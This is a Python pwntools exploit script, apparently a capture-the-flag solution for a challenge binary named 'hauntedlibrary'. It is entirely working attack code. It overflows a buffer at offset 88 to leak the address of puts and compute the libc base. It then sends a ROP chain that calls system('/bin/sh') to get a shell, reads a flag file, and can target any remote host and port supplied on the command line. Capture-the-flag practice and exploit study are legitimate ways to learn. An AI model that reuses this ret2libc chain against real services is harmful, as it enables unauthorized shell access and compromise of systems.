#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./hauntedlibrary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
bof = 88
line = b'> '
book_name = 'BookOfTheDead.txt'

leak_payload = flat({
    bof: [
        exe.sym['book_of_the_dead'],
        exe.sym['main']
    ]

    })

io.sendlineafter(line, b'2')
io.sendlineafter(line, leak_payload)

io.recvuntil(b'puts(): ')
puts_leak = int(io.recv(14), 16)
libc.address = puts_leak - libc.sym.puts


success(f"puts leak @ {hex(puts_leak)}")
success(f"libc base @ {hex(libc.address)}")

rop = ROP(libc)

call_shell = flat({
    bof: [
        rop.rdi[0], next(libc.search(b"/bin/sh\x00")),
        rop.ret[0],
        libc.sym.system
    ]
    })

io.sendlineafter(line, b'2')
io.sendlineafter(line, call_shell)
io.sendline(f"cat {book_name}".encode())
data = io.recvregex(rb'deadface\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
